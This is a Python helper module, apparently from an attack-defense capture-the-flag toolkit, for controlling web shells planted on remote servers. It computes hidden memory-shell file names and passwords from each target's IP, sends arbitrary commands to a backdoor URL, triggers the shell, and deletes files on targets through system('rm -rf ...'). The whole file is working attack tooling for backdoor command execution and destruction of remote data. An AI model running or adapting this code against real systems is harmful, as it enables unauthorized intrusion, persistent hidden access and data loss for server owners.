from config import Config
from urllib import parse
import socket
from hashlib import md5

class Utils:

    def getMemShellName(url):
        hostname = parse.urlparse(url).hostname
        ip = socket.gethostbyname(hostname)    
        return "." + md5((str(ip) + "1145141919").encode("UTF-8")).hexdigest()

    def getMemShellPass(url):
        hostname = parse.urlparse(url).hostname
        ip = socket.gethostbyname(hostname)
        return md5((str(ip) + "xuxfff").encode("UTF-8")).hexdigest()
    async def exec(url,command):
        try:
            shellPath = f"{url}/{Config.backdoorPath}?{Config.backdoorPass}={command}"
            resp = await Config.session.post(
                url=shellPath,
                data = {
                    Config.backdoorPass:command
                },
                timeout=10
            )
            return await resp.text()
        except:
            return None

    async def execWithMemShell(url,command):
        shellName = Utils.getMemShellName(url)
        shellPass = Utils.getMemShellPass(url)
        shellPath = f"{url}/{Config.shellPath.strip('/var/www/html/')}/{shellName}"
        try:
            resp = await Config.session.post(
                url = shellPath,
                data = {
                    shellPass:command
                },
                timeout=10
            )
            return await resp.text()
        except:
            return None
        
    #trigger the memshell
    async def trigger(url):
        resp = await Config.session.get(
            url = url
        )
        res = await resp.text()
        if 'no_flag' in res:
            print(url)
    #del something...  such as del self-contained backdoor
    async def delete(url,file):
        await Utils.exec(url,f"system('rm -rf {file}')")